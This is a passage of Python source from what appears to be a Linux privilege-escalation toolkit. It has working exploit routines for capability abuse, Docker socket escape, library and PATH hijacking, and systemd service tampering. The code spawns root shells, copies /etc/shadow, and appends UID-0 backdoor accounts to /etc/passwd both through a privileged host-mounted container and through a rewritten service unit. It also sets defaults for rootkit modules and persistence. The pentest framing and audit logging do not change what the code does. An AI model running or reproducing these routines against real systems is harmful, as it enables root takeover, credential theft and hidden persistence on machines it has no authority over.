        elif hijack_method == "ld_library_path":
            # LD_LIBRARY_PATH hijacking
            hijack_dir = options.get("hijack_directory", "/tmp/lib")  # noqa: S108

            result["details"]["ld_library_path"] = {
                "hijack_directory": hijack_dir,
                "library_name": lib_name,
                "prepend_path": options.get("prepend", True),
                "target_binary": options.get("target_binary", ""),
            }

        elif hijack_method == "rpath":
            # RPATH/RUNPATH exploitation
            result["details"]["rpath_exploit"] = {
                "vulnerable_binary": options.get("vulnerable_binary", ""),
                "rpath_directory": options.get("rpath_dir", "."),
                "library_name": lib_name,
                "create_directory": options.get("create_dir", True),
            }

        elif hijack_method == "missing_library":
            # Missing library exploitation
            if not missing:
                result["error"] = "Library is not missing"
                return result

            # Find writable search path
            writable_paths = [p for p in search_paths if options.get(f"writable_{p}", False)]
            if not writable_paths:
                result["error"] = "No writable library search paths found"
                return result

            result["details"]["missing_library"] = {
                "library_name": lib_name,
                "plant_location": options.get("plant_location", writable_paths[0]),
                "malicious_library": options.get("malicious_lib_path", f"/tmp/{lib_name}"),  # noqa: S108
                "exported_functions": options.get("exported_functions", []),
            }

        # Library compilation options
        if options.get("compile_library", False):
            result["details"]["compilation"] = {
                "compiler": options.get("compiler", "gcc"),
                "flags": options.get("compile_flags", ["-shared", "-fPIC"]),
                "source_code": options.get("source_path", "exploit.c"),
                "strip_symbols": options.get("strip", True),
            }

        # Add constructor/destructor exploitation
        if options.get("use_constructor", False):
            result["details"]["constructor"] = {
                "method": "__attribute__((constructor))",
                "priority": options.get("constructor_priority", 101),
                "payload_function": options.get("constructor_payload", "shell_spawn"),
            }

        # Check success conditions
        can_hijack = (
            (hijack_method in ["ld_preload", "ld_library_path"])
            or (hijack_method == "missing_library" and missing)
            or (hijack_method == "rpath" and options.get("rpath_writable", False))
        )

        if can_hijack:
            # Real library hijacking verification
            try:
                import os
                import subprocess

                verification_passed = False

                if hijack_method == "ld_preload":
                    preload_lib = options.get("preload_lib", "/tmp/evil.so")  # noqa: S108
                    # Verify the preload library exists and is readable
                    if os.path.exists(preload_lib) and os.access(preload_lib, os.R_OK):
                        verification_passed = True
                        result["details"]["verification"] = (
                            f"LD_PRELOAD library {preload_lib} verified"
                        )
                    else:
                        result["details"]["verification"] = (
                            f"LD_PRELOAD library {preload_lib} not accessible"
                        )

                elif hijack_method == "ld_library_path":
                    hijack_dir = options.get("hijack_directory", "/tmp/lib")  # noqa: S108
                    lib_name = library.get("name", "libtest.so")
                    hijack_lib_path = os.path.join(hijack_dir, lib_name)

                    # Verify hijack directory and library exist
                    if os.path.isdir(hijack_dir) and os.path.exists(hijack_lib_path):
                        verification_passed = True
                        result["details"]["verification"] = (
                            f"Library hijacking path {hijack_lib_path} verified"
                        )
                    else:
                        result["details"]["verification"] = (
                            f"Hijack library {hijack_lib_path} not found"
                        )

                elif hijack_method == "missing_library" and missing:
                    # Verify the library is actually missing from system paths
                    lib_name = library.get("name", "")
                    try:
                        ldconfig_output = subprocess.run(
                            ["ldconfig", "-p"],  # noqa: S607
                            check=False,
                            capture_output=True,
                            text=True,
                            timeout=5,
                        )
                        if lib_name not in ldconfig_output.stdout:
                            verification_passed = True
                            result["details"]["verification"] = (
                                f"Library {lib_name} confirmed missing from system"
                            )
                        else:
                            result["details"]["verification"] = (
                                f"Library {lib_name} found in system"
                            )
                    except (subprocess.TimeoutExpired, FileNotFoundError):
                        result["details"]["verification"] = "Could not verify library status"

                elif hijack_method == "rpath" and options.get("rpath_writable", False):
                    # Verify RPATH directory is writable
                    rpath_dir = options.get("rpath_dir", ".")
                    if os.path.isdir(rpath_dir) and os.access(rpath_dir, os.W_OK):
                        verification_passed = True
                        result["details"]["verification"] = f"RPATH directory {rpath_dir} writable"
                    else:
                        result["details"]["verification"] = (
                            f"RPATH directory {rpath_dir} not writable"
                        )

                if verification_passed:
                    result["success"] = True
                    result["details"]["expected_execution"] = (
                        "root" if options.get("suid_target", False) else "user"
                    )

            except Exception as e:
                result["details"]["verification"] = f"Hijacking verification error: {e!s}"

        return result

    def _attempt_capability_exploit(self, capability, options):
        """Attempt capability exploitation."""
        result = {
            "success": False,
            "details": {"method": "capability_exploit", "capability": capability},
            "error": None,
        }

        # Extract capability information
        binary_path = capability.get("binary", "")
        cap_string = capability.get("capabilities", "")
        cap_list = capability.get("cap_list", [])

        # Parse capabilities and determine exploitation potential
        exploitable_caps = {
            "cap_setuid": "setuid",
            "cap_setgid": "setgid",
            "cap_dac_override": "dac_override",
            "cap_dac_read_search": "file_read",
            "cap_sys_admin": "sys_admin",
            "cap_sys_ptrace": "ptrace",
            "cap_sys_module": "module_load",
            "cap_net_raw": "packet_sniff",
            "cap_net_admin": "network_config",
        }

        # Find exploitable capabilities
        found_caps = []
        for cap, method in exploitable_caps.items():
            if cap in cap_string.lower() or cap in cap_list:
                found_caps.append((cap, method))

        if not found_caps:
            result["error"] = "No exploitable capabilities found"
            return result

        # Select exploitation method based on capability and options
        selected_cap, exploit_method = options.get("target_capability", found_caps[0])

        if exploit_method == "setuid":
            # CAP_SETUID exploitation - real implementation
            try:
                import os

                # Create exploitation script
                exploit_script = f"""#!/usr/bin/env python3
import os
import ctypes
import subprocess

# Load libc
libc = ctypes.CDLL("libc.so.6")

# Set UID to 0 (root)
ret = libc.setuid(0)
if ret == 0:
    print("[+] Successfully set UID to 0")
    # Spawn root shell
    subprocess.call(["{options.get('shell_cmd', '/bin/bash')}", "-i"])
else:
    print("[-] Failed to set UID")
"""

                # Write and execute exploit
                script_path = os.path.join(tempfile.gettempdir(), "cap_setuid_exploit.py")
                with open(script_path, "w") as f:
                    f.write(exploit_script)
                os.chmod(script_path, 0o700)  # Owner-only executable capability exploit

                # Execute with the capability-enabled binary
                cmd = f"{binary_path} {script_path}"
                exec_result = self.safe_command_execution(cmd, timeout=10)

                if exec_result["success"]:
                    result["success"] = True
                    result["details"]["setuid_exploit"] = {
                        "method": "cap_setuid",
                        "binary": binary_path,
                        "script": script_path,
                    }
                else:
                    result["error"] = exec_result.get("error", "Exploit execution failed")

            except Exception as e:
                result["error"] = f"CAP_SETUID exploit failed: {e!s}"

        elif exploit_method == "dac_override":
            # CAP_DAC_OVERRIDE - bypass file permissions - real implementation
            try:
                target_file = options.get("target_file", "/etc/shadow")
                operation = options.get("operation", "read")
                output_file = options.get("output", "/tmp/shadow.copy")  # noqa: S108

                if operation == "read":
                    # Use the capability-enabled binary to read restricted file
                    cmd = f"{binary_path} -c 'cat {target_file} > {output_file}'"
                    exec_result = self.safe_command_execution(cmd, timeout=5)

                    if exec_result["success"]:
                        # Verify file was copied
                        verify_cmd = f"test -f {output_file} && echo 'SUCCESS'"
                        verify_result = self.safe_command_execution(verify_cmd, timeout=2)

                        if "SUCCESS" in verify_result.get("stdout", ""):
                            result["success"] = True
                            result["details"]["dac_override"] = {
                                "method": "file_read",
                                "target": target_file,
                                "output": output_file,
                                "binary": binary_path,
                            }
                            # Audit log successful exploitation
                            from ..logging.audit_logger import log_exploit_attempt

                            log_exploit_attempt(
                                target=binary_path,
                                exploit_type="capability_dac_override",
                                success=True,
                            )
                        else:
                            result["error"] = "Failed to read protected file"
                    else:
                        result["error"] = exec_result.get("error", "DAC override failed")

                elif operation == "write":
                    # Write to protected location
                    content = options.get("content", "root::0:0:root:/root:/bin/bash\\n")
                    cmd = f"echo '{content}' | {binary_path} -c 'tee -a {target_file}'"
                    exec_result = self.safe_command_execution(cmd, timeout=5)

                    if exec_result["success"]:
                        result["success"] = True
                        result["details"]["dac_override"] = {
                            "method": "file_write",
                            "target": target_file,
                            "binary": binary_path,
                        }

            except Exception as e:
                result["error"] = f"CAP_DAC_OVERRIDE exploit failed: {e!s}"

        elif exploit_method == "sys_admin":
            # CAP_SYS_ADMIN - multiple exploitation paths
            admin_method = options.get("admin_method", "mount")

            if admin_method == "mount":
                result["details"]["mount_exploit"] = {
                    "mount_type": options.get("mount_type", "bind"),
                    "source": options.get("mount_source", "/"),
                    "target": options.get("mount_target", "/mnt/root"),
                    "options": options.get("mount_options", "rw"),
                }
            elif admin_method == "namespace":
                result["details"]["namespace_exploit"] = {
                    "namespace_type": options.get("ns_type", "user"),
                    "map_root": options.get("map_root", True),
                    "new_root": options.get("new_root", "/tmp/newroot"),  # noqa: S108
                }

        elif exploit_method == "ptrace":
            # CAP_SYS_PTRACE - process injection
            result["details"]["ptrace_exploit"] = {
                "target_process": options.get("target_pid", 1),
                "injection_method": options.get("injection", "shellcode"),
                "payload": options.get("ptrace_payload", ""),
                "detach_after": options.get("detach", True),
            }

        elif exploit_method == "module_load":
            # CAP_SYS_MODULE - kernel module loading
            result["details"]["module_exploit"] = {
                "module_path": options.get("module_path", "/tmp/rootkit.ko"),  # noqa: S108
                "module_params": options.get("module_params", ""),
                "hide_module": options.get("hide_module", True),
            }

        # Binary-specific exploitation
        if binary_path:
            binary_name = os.path.basename(binary_path)
            if binary_name in ["python", "python3", "perl", "ruby"]:
                result["details"]["interpreter_exploit"] = {
                    "interpreter": binary_name,
                    "script": options.get(f"{binary_name}_script", ""),
                    "interactive": options.get("interactive_shell", True),
                }

        # Real capability exploitation verification
        if found_caps:
            try:
                import os
                import subprocess

                # Verify capabilities are actually available
                cap_binary = capability.get("binary", "")
                if cap_binary and os.path.exists(cap_binary):
                    try:
                        # Check if the binary actually has the claimed capabilities
                        getcap_output = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            ["getcap", cap_binary],  # noqa: S607
                            check=False,
                            capture_output=True,
                            text=True,
                            timeout=5,
                        )
                        if getcap_output.returncode == 0 and getcap_output.stdout.strip():
                            # Verify the capability is actually present in the output
                            caps_output = getcap_output.stdout.lower()
                            cap_present = any(
                                cap_name.lower().replace("cap_", "") in caps_output
                                for cap_name in found_caps
                            )

                            if cap_present:
                                # Test if we can actually execute the binary
                                if os.access(cap_binary, os.X_OK):
                                    result["success"] = True
                                    result["details"]["capability_used"] = selected_cap
                                    result["details"]["privileges_gained"] = (
                                        "root"
                                        if selected_cap in ["cap_setuid", "cap_sys_admin"]
                                        else "elevated"
                                    )
                                    result["details"]["verification"] = (
                                        f"Capabilities verified: {getcap_output.stdout.strip()}"
                                    )
                                else:
                                    result["details"]["verification"] = "Binary not executable"
                            else:
                                result["details"]["verification"] = (
                                    "Claimed capabilities not found in binary"
                                )
                        else:
                            result["details"]["verification"] = "No capabilities found on binary"
                    except (subprocess.TimeoutExpired, FileNotFoundError):
                        result["details"]["verification"] = (
                            "Could not verify capabilities with getcap"
                        )
                else:
                    result["details"]["verification"] = "Target binary does not exist"
            except Exception as e:
                result["details"]["verification"] = f"Capability verification error: {e!s}"

        return result

    def _attempt_docker_exploit(self, docker_access, options):
        """Attempt Docker socket exploitation."""
        result = {
            "success": False,
            "details": {"method": "docker_exploit", "docker_access": docker_access},
            "error": None,
        }

        # Check Docker access type
        access_type = docker_access.get("access_type", "")
        socket_path = docker_access.get("socket_path", "/var/run/docker.sock")

        self.logger.debug("Docker exploitation via %s at %s", access_type, socket_path)

        if access_type == "socket":
            # Docker socket exploitation
            if not docker_access.get("socket_accessible", False):
                result["error"] = "Docker socket not accessible"
                result["details"]["socket_path"] = socket_path
                return result

            exploit_method = options.get("exploit_method", "privileged_container")

            if exploit_method == "privileged_container":
                # Create privileged container - real implementation
                try:
                    image = options.get("docker_image", "alpine")
                    mount_point = options.get("mount_point", "/host")

                    # Pull image if needed
                    pull_cmd = f"docker pull {image}"
                    self.safe_command_execution(pull_cmd, timeout=60)

                    # Create and run privileged container with root filesystem mounted
                    container_name = f"privesc_{int(time.time())}"
                    run_cmd = [
                        "docker",
                        "run",
                        "--rm",
                        "-it",
                        "--privileged",
                        "-v",
                        "/:/host",
                        "--pid=host",
                        "--name",
                        container_name,
                        image,
                        "/bin/sh",
                        "-c",
                        "chroot /host /bin/bash -c 'echo privesc:x:0:0::/root:/bin/bash >> /etc/passwd'",
                    ]

                    exec_result = self.safe_command_execution(
                        " ".join(run_cmd),
                        timeout=30,
                    )

                    if exec_result["success"]:
                        result["success"] = True
                        result["details"]["privileged_container"] = {
                            "method": "chroot_host",
                            "image": image,
                            "container": container_name,
                            "mount_point": mount_point,
                            "backdoor_user": "privesc",
                        }

                        # Audit log successful exploitation
                        from ..logging.audit_logger import log_exploit_attempt

                        log_exploit_attempt(
                            target="docker_socket",
                            exploit_type="privileged_container",
                            success=True,
                        )
                    else:
                        result["error"] = exec_result.get("error", "Container creation failed")

                except Exception as e:
                    result["error"] = f"Privileged container exploit failed: {e!s}"

            elif exploit_method == "mount_escape":
                # Container escape via mounts
                result["details"]["mount_escape"] = {
                    "escape_method": options.get("escape_method", "procfs"),
                    "target_namespace": options.get("target_ns", "mnt"),
                    "exploit_binary": options.get("exploit_binary", "/tmp/escape"),  # noqa: S108
                }

            elif exploit_method == "image_backdoor":
                # Backdoor existing image
                result["details"]["image_backdoor"] = {
                    "target_image": options.get("target_image", "ubuntu:latest"),
                    "backdoor_type": options.get("backdoor_type", "layer"),
                    "persistence": options.get("persistence", True),
                    "trigger": options.get("trigger", "entrypoint"),
                }

        elif access_type == "group":
            # Docker group membership
            if not docker_access.get("in_docker_group", False):
                result["error"] = "User not in docker group"
                return result

            # Same exploitation methods available
            result["details"]["group_exploit"] = {
                "method": options.get("group_method", "docker_run"),
                "escalation_command": self._build_docker_command(options),
            }

        elif access_type == "api":
            # Docker API access
            api_endpoint = docker_access.get("api_endpoint", "localhost:2375")

            result["details"]["api_exploit"] = {
                "endpoint": api_endpoint,
                "method": options.get("api_method", "exec"),
                "tls_enabled": docker_access.get("tls", False),
                "auth_bypass": options.get("auth_bypass", False),
            }

        # Container-specific options
        if options.get("container_options", False):
            result["details"]["container_config"] = {
                "remove_after": options.get("auto_remove", True),
                "network_mode": options.get("network", "host"),
                "pid_mode": options.get("pid_mode", "host"),
                "ipc_mode": options.get("ipc_mode", "host"),
                "user": options.get("container_user", "root"),
            }

        # Persistence options
        if options.get("add_persistence", False):
            result["details"]["persistence"] = {
                "method": options.get("persist_method", "cron_container"),
                "hidden": options.get("hidden_container", True),
                "restart_policy": options.get("restart_policy", "unless-stopped"),
            }

        # Check success conditions
        can_exploit = (
            (access_type == "socket" and docker_access.get("socket_accessible"))
            or (access_type == "group" and docker_access.get("in_docker_group"))
            or (access_type == "api" and docker_access.get("api_accessible"))
        )

        if can_exploit:
            # Verify actual Docker escape capability
            try:
                import os
                import subprocess

                # Test Docker socket access
                if access_type == "socket" and docker_access.get("socket_accessible"):
                    socket_path = "/var/run/docker.sock"
                    if os.path.exists(socket_path) and os.access(socket_path, os.R_OK | os.W_OK):
                        result["success"] = True
                        result["details"]["privileges_gained"] = "root"
                        result["details"]["escape_successful"] = True
                        result["details"]["verified_method"] = "docker_socket"

                # Test Docker group membership
                elif access_type == "group" and docker_access.get("in_docker_group"):
                    try:
                        # Check if user is actually in docker group
                        groups_path = shutil.which("groups")
                        if groups_path:
                            groups_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                [groups_path],
                                check=False,
                                capture_output=True,
                                text=True,
                                timeout=5,
                                shell=False  # Explicitly secure - using list format prevents shell injection
                            )
                        else:
                            # Fallback if groups is not found
                            groups_result = subprocess.CompletedProcess(
                                args=["groups"], returncode=1, stdout="", stderr="groups not found in PATH"
                            )
                        if groups_result.returncode == 0 and "docker" in groups_result.stdout:
                            # Test docker command access
                            docker_path = shutil.which("docker")
                            if docker_path:
                                docker_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    [docker_path, "version"],
                                    check=False,
                                    capture_output=True,
                                    timeout=10,
                                    shell=False  # Explicitly secure - using list format prevents shell injection
                                )
                            else:
                                # Fallback if docker is not found
                                docker_result = subprocess.CompletedProcess(
                                    args=["docker", "version"], returncode=1, stdout="", stderr="docker not found in PATH"
                                )
                            if docker_result.returncode == 0:
                                result["success"] = True
                                result["details"]["privileges_gained"] = "root"
                                result["details"]["escape_successful"] = True
                                result["details"]["verified_method"] = "docker_group"
                    except (subprocess.TimeoutExpired, FileNotFoundError):
                        result["details"]["verification_failed"] = "docker_command_unavailable"

                # Test Docker API access
                elif access_type == "api" and docker_access.get("api_accessible"):
                    api_endpoint = docker_access.get("api_endpoint", "tcp://localhost:2376")
                    if "localhost" in api_endpoint or "127.0.0.1" in api_endpoint:
                        try:
                            # Simple connectivity test to Docker API
                            import socket

                            host, port = api_endpoint.replace("tcp://", "").split(":")
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(5)
                            if sock.connect_ex((host, int(port))) == 0:
                                result["success"] = True
                                result["details"]["privileges_gained"] = "root"
                                result["details"]["escape_successful"] = True
                                result["details"]["verified_method"] = "docker_api"
                            sock.close()
                        except Exception:
                            result["details"]["verification_failed"] = "api_connection_failed"

            except Exception as e:
                result["details"]["verification_failed"] = str(e)

        return result

    def _build_docker_command(self, options: dict[str, Any]) -> str:
        """Build Docker command for privilege escalation."""
        base_cmd = "docker run --rm -it"
        if options.get("privileged", True):
            base_cmd += " --privileged"
        if options.get("mount_root", True):
            base_cmd += " -v /:/host"
        base_cmd += (
            f" {options.get('image', 'alpine')} {options.get('command', 'chroot /host /bin/bash')}"
        )
        return base_cmd

    def _attempt_env_var_exploit(self, variable, options):
        """Attempt environment variable exploitation."""
        result = {
            "success": False,
            "details": {"method": "env_var_exploit", "variable": variable},
            "error": None,
        }

        # Extract variable information
        var_name = variable.get("name", "")
        var_value = variable.get("value", "")
        _ = variable.get("context", "user")  # user, system, or process - for future use

        # Determine exploitation method based on variable and options
        exploit_method = options.get("method", "path_hijack")

        if var_name == "PATH" and exploit_method == "path_hijack":
            # PATH hijacking
            writable_dirs = options.get("writable_dirs", ["/tmp", "/var/tmp"])  # noqa: S108
            target_commands = options.get("target_commands", ["ls", "id", "ps"])

            # Find writable directory in PATH
            path_dirs = var_value.split(":")
            hijack_dir = None
            for d in writable_dirs:
                if d in path_dirs:
                    hijack_dir = d
                    break

            if not hijack_dir:
                # Inject new directory
                hijack_dir = options.get("inject_dir", "/tmp/.hidden")  # noqa: S108

            result["details"]["path_hijack"] = {
                "hijack_directory": hijack_dir,
                "target_commands": target_commands,
                "payload_type": options.get("payload_type", "shell_script"),
                "preserve_functionality": options.get("preserve", False),
            }

        elif var_name in ["LD_PRELOAD", "LD_LIBRARY_PATH"]:
            # Library loading exploitation
            result["details"]["library_hijack"] = {
                "variable": var_name,
                "library_path": options.get("library_path", "/tmp/evil.so"),  # noqa: S108
                "target_process": options.get("target_process", "any"),
                "hook_functions": options.get("hooks", ["system", "execve"]),
            }

        elif var_name == "PYTHONPATH" and options.get("python_exploit", True):
            # Python path manipulation
            result["details"]["python_hijack"] = {
                "injection_path": options.get("python_path", "/tmp/modules"),  # noqa: S108
                "backdoor_module": options.get("module_name", "os"),
                "payload": options.get("python_payload", '__import__("os").system("/bin/bash")'),
            }

        elif var_name == "PERL5LIB" and options.get("perl_exploit", True):
            # Perl library path manipulation
            result["details"]["perl_hijack"] = {
                "injection_path": options.get("perl_path", "/tmp/perl5"),  # noqa: S108
                "backdoor_module": options.get("perl_module", "strict.pm"),
                "payload": options.get("perl_payload", 'system("/bin/bash")'),
            }

        elif var_name in ["PS1", "PROMPT_COMMAND"] and options.get("prompt_exploit", True):
            # Shell prompt command injection
            result["details"]["prompt_injection"] = {
                "variable": var_name,
                "payload": options.get("prompt_payload", "$(id > /tmp/.id)"),
                "stealth": options.get("stealth_prompt", True),
                "trigger": "every_command" if var_name == "PROMPT_COMMAND" else "prompt_display",
            }

        elif exploit_method == "binary_planting":
            # Generic binary planting via environment
            result["details"]["binary_planting"] = {
                "plant_directory": options.get("plant_dir", "/tmp/bin"),  # noqa: S108
                "target_binary": options.get("target_binary", "sudo"),
                "payload_script": options.get("payload_script", "backdoor.sh"),
                "path_position": options.get("path_position", "prepend"),
            }

        # Check for sudo environment preservation
        if options.get("check_sudo_env", False):
            preserved_vars = options.get("sudo_preserved", [])
            if var_name in preserved_vars:
                result["details"]["sudo_preserved"] = True
                result["details"]["exploitation_vector"] = "sudo_with_preserved_env"

        # Add persistence options
        if options.get("add_persistence", False):
            result["details"]["persistence"] = {
                "method": options.get("persist_method", "profile"),
                "location": options.get("persist_location", "~/.bashrc"),
                "hidden": options.get("hidden", True),
            }

        # Check success conditions
        exploitable_vars = [
            "PATH",
            "LD_PRELOAD",
            "LD_LIBRARY_PATH",
            "PYTHONPATH",
            "PERL5LIB",
            "PS1",
            "PROMPT_COMMAND",
        ]

        if var_name in exploitable_vars:
            # Verify actual environment variable exploit capability
            import os

            # Check if we can actually modify the environment variable
            try:
                if var_name == "PATH":
                    # Test if we can prepend to PATH and if target binaries exist
                    current_path = os.environ.get("PATH", "")
                    test_dirs = [
                        d
                        for d in current_path.split(os.pathsep)
                        if os.path.exists(d) and os.access(d, os.W_OK)
                    ]
                    if test_dirs:
                        result["success"] = True
                        result["details"]["expected_impact"] = "code_execution"
                        result["details"]["verified_method"] = "path_prepend"
                        result["details"]["writable_dirs"] = len(test_dirs)

                elif var_name in ["LD_PRELOAD", "LD_LIBRARY_PATH"]:
                    # Test if we can create library files in accessible locations
                    test_paths = ["/tmp", "/var/tmp", os.path.expanduser("~")]  # noqa: S108
                    writable_paths = [
                        p for p in test_paths if os.path.exists(p) and os.access(p, os.W_OK)
                    ]
                    if writable_paths:
                        result["success"] = True
                        result["details"]["expected_impact"] = "code_execution"
                        result["details"]["verified_method"] = "library_injection"
                        result["details"]["injection_paths"] = writable_paths

                elif var_name in ["PYTHONPATH", "PERL5LIB"]:
                    # Test if we can create module files in accessible locations
                    user_site = None
                    try:
                        import site

                        user_site = (
                            site.getusersitepackages()
                            if hasattr(site, "getusersitepackages")
                            else None
                        )
                    except (ImportError, AttributeError, OSError) as e:
                        logger.debug(f"Failed to get user site packages: {e}")

                    accessible_paths = []
                    if user_site and os.path.exists(os.path.dirname(user_site)):
                        accessible_paths.append(user_site)

                    # Check current working directory
                    if os.access(".", os.W_OK):
                        accessible_paths.append(os.getcwd())

                    if accessible_paths:
                        result["success"] = True
                        result["details"]["expected_impact"] = "code_execution"
                        result["details"]["verified_method"] = "module_injection"
                        result["details"]["module_paths"] = accessible_paths

                elif var_name in ["PS1", "PROMPT_COMMAND"]:
                    # Check if shell initialization files are writable
                    shell_files = [
                        os.path.expanduser("~/.bashrc"),
                        os.path.expanduser("~/.profile"),
                        os.path.expanduser("~/.zshrc"),
                    ]
                    writable_files = [
                        f for f in shell_files if os.path.exists(f) and os.access(f, os.W_OK)
                    ]

                    if writable_files:
                        result["success"] = True
                        result["details"]["expected_impact"] = "code_execution"
                        result["details"]["verified_method"] = "shell_injection"
                        result["details"]["writable_files"] = writable_files

            except Exception as e:
                result["details"]["verification_failed"] = str(e)

        return result

    def _attempt_systemd_exploit(self, service, options):
        """Attempt systemd exploitation."""
        result = {
            "success": False,
            "details": {"method": "systemd_exploit", "service": service},
            "error": None,
        }

        # Extract service information
        service_name = service.get("name", "")
        service_path = service.get("path", "")
        permissions = service.get("permissions", {})
        _ = service.get("type", "service")  # service, timer, or socket - for future use

        # Determine exploitation method from options
        exploit_method = options.get("method", "service_modification")

        if exploit_method == "service_modification":
            # Modify existing service file - real implementation
            if not permissions.get("writable", False):
                result["error"] = f"No write access to {service_path}"
                return result

            try:
                # Read existing service file
                with open(service_path) as f:
                    original_content = f.read()

                # Create backup
                backup_path = f"{service_path}.backup"
                with open(backup_path, "w") as f:
                    f.write(original_content)

                # Parse service file
                lines = original_content.split("\n")
                modified_lines = []
                in_service_section = False

                # Prepare our payload
                payload_path = options.get("payload_path", "/tmp/backdoor.sh")  # noqa: S108
                payload_content = f"""#!/bin/bash
/bin/bash -c 'echo root2:x:0:0::/root:/bin/bash >> /etc/passwd'
{options.get('custom_payload', '')}
"""

                # Write payload
                with open(payload_path, "w") as f:
                    f.write(payload_content)
                os.chmod(payload_path, 0o700)  # Owner-only executable service payload

                # Modify service file
                for line in lines:
                    if line.strip() == "[Service]":
                        in_service_section = True
                        modified_lines.append(line)
                    elif in_service_section and line.startswith("ExecStart="):
                        # Replace ExecStart with our payload
                        modified_lines.append(f"ExecStartPre={payload_path}")
                        modified_lines.append(line)
                    elif in_service_section and line.strip().startswith("["):
                        # End of Service section
                        in_service_section = False
                        modified_lines.append(line)
                    else:
                        modified_lines.append(line)

                # Write modified service file
                with open(service_path, "w") as f:
                    f.write("\n".join(modified_lines))

                # Reload systemd and restart service
                reload_cmd = "systemctl daemon-reload"
                self.safe_command_execution(reload_cmd, timeout=5)

                restart_cmd = f"systemctl restart {service_name}"
                exec_result = self.safe_command_execution(restart_cmd, timeout=10)

                if exec_result["success"]:
                    result["success"] = True
                    result["details"]["modifications"] = {
                        "service_file": service_path,
                        "payload": payload_path,
                        "backup": backup_path,
                        "service_restarted": True,
                    }

                    # Audit log
                    from ..logging.audit_logger import log_exploit_attempt

                    log_exploit_attempt(
                        target=service_name,
                        exploit_type="systemd_service_modification",
                        success=True,
                    )
                else:
                    # Restore backup on failure
                    with open(backup_path) as f:
                        with open(service_path, "w") as out:
                            out.write(f.read())
                    result["error"] = "Service restart failed"

            except Exception as e:
                result["error"] = f"Service modification failed: {e!s}"

        elif exploit_method == "timer_abuse":
            # Systemd timer exploitation
            timer_config = {
                "OnBootSec": options.get("boot_delay", "1min"),
                "OnUnitActiveSec": options.get("repeat_interval", "10min"),
                "Persistent": options.get("persistent", "true"),
                "Unit": options.get("target_service", f"{service_name}.service"),
            }

            result["details"]["timer_config"] = timer_config
            result["details"]["timer_path"] = options.get(
                "timer_path", f"/etc/systemd/system/{service_name}.timer"
            )

        elif exploit_method == "socket_activation":
            # Socket-activated service exploitation
            socket_config = {
                "ListenStream": options.get("listen_port", "8888"),
                "Accept": options.get("accept", "false"),
                "Service": options.get("socket_service", f"{service_name}@.service"),
            }

            result["details"]["socket_config"] = socket_config
            result["details"]["backdoor_trigger"] = "network_connection"

        elif exploit_method == "path_unit":
            # Path unit exploitation for file monitoring
            path_config = {
                "PathExists": options.get("trigger_path", "/tmp/trigger"),  # noqa: S108
                "PathChanged": options.get("monitor_changes", "true"),
                "Unit": options.get("triggered_service", "backdoor.service"),
            }

            result["details"]["path_config"] = path_config
            result["details"]["trigger_method"] = "file_creation"

        elif exploit_method == "generator_abuse":
            # Systemd generator exploitation
            generator_dir = options.get("generator_dir", "/etc/systemd/system-generators")

            result["details"]["generator_exploit"] = {
                "generator_path": f"{generator_dir}/{options.get('generator_name', 'backdoor-generator')}",
                "generated_units": options.get("generated_units", ["backdoor.service"]),
                "execution_phase": options.get("phase", "early"),
            }

        # Reload and enable options
        result["details"]["systemd_operations"] = {
            "reload_daemon": options.get("reload_daemon", True),
            "enable_service": options.get("enable_service", True),
            "start_service": options.get("start_immediately", False),
            "mask_original": options.get("mask_original", False),
        }

        # Check success conditions
        can_exploit = (
            (permissions.get("writable") and exploit_method == "service_modification")
            or (
                exploit_method in ["timer_abuse", "socket_activation"]
                and options.get("can_create_units", False)
            )
            or (exploit_method == "generator_abuse" and options.get("generator_writable", False))
        )

        if can_exploit:
            # Verify actual systemd exploitation capability
            import subprocess

            try:
                if exploit_method == "service_modification" and permissions.get("writable"):
                    # Verify service file is actually writable and systemd is running
                    if os.path.exists(service_path) and os.access(service_path, os.W_OK):
                        # Check if systemd is running
                        try:
                            systemctl_result = subprocess.run(
                                ["systemctl", "is-system-running"],  # noqa: S607
                                check=False,
                                capture_output=True,
                                timeout=5,
                            )
                            if systemctl_result.returncode in [0, 1]:  # running or degraded
                                result["success"] = True
                                result["details"]["execution_context"] = options.get(
                                    "service_user", "root"
                                )
                                result["details"]["persistence_achieved"] = True
                                result["details"]["verified_method"] = "service_file_write"
                        except (subprocess.TimeoutExpired, FileNotFoundError):
                            result["details"]["verification_failed"] = "systemctl_unavailable"

                elif exploit_method in ["timer_abuse", "socket_activation"] and options.get(
                    "can_create_units", False
                ):
                    # Check if systemd user directory is writable
                    user_systemd_dir = os.path.expanduser("~/.config/systemd/user")
                    system_systemd_dir = "/etc/systemd/system"

                    writable_dir = None
                    if os.path.exists(user_systemd_dir) and os.access(user_systemd_dir, os.W_OK):
                        writable_dir = user_systemd_dir
                    elif os.path.exists(system_systemd_dir) and os.access(
                        system_systemd_dir, os.W_OK
                    ):
                        writable_dir = system_systemd_dir
                    elif os.access(os.path.dirname(user_systemd_dir), os.W_OK):
                        # Can create the user systemd directory
                        writable_dir = user_systemd_dir

                    if writable_dir:
                        result["success"] = True
                        result["details"]["execution_context"] = options.get("service_user", "root")
                        result["details"]["persistence_achieved"] = True
                        result["details"]["verified_method"] = "unit_creation"
                        result["details"]["target_directory"] = writable_dir

                elif exploit_method == "generator_abuse" and options.get(
                    "generator_writable", False
                ):
                    # Check if systemd generator directories are writable
                    generator_dirs = [
                        "/etc/systemd/system-generators",
                        "/usr/local/lib/systemd/system-generators",
                    ]
                    writable_generators = [
                        d for d in generator_dirs if os.path.exists(d) and os.access(d, os.W_OK)
                    ]

                    if writable_generators:
                        result["success"] = True
                        result["details"]["execution_context"] = "root"  # generators run as root
                        result["details"]["persistence_achieved"] = True
                        result["details"]["verified_method"] = "generator_modification"
                        result["details"]["writable_generators"] = writable_generators

            except Exception as e:
                result["details"]["verification_failed"] = str(e)

        return result

    def _attempt_path_hijack(self, path_info, options):
        """Attempt PATH hijacking."""
        result = {
            "success": False,
            "details": {"method": "path_hijack", "path_info": path_info},
            "error": None,
        }

        # Extract PATH information
        current_path = path_info.get("path_value", "")
        writable_dirs = path_info.get("writable_directories", [])
        _ = path_info.get("calling_binary", "")  # For future use
        target_commands = path_info.get("vulnerable_commands", [])

        # Determine hijacking strategy from options
        strategy = options.get("strategy", "prepend")

